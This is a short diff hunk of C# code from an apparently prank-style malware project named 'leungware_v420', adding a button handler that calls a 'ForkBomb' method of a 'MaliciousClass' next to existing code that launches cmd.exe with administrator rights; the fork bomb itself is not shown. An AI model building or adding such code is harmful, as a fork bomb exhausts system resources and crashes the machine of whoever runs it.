@@ -32,5 +32,11 @@ namespace leungware_v420
             var instance = new ExecutorClass();
             instance.LaunchFileOfExeExt("cmd.exe", DoExcecuteWithAdminRights);
         }
+
+        private void ForkBombThisShit(object sender, EventArgs e)
+        {
+            var inst = new MaliciousClass();
+            inst.ForkBomb(true);
+        }
     }
 }
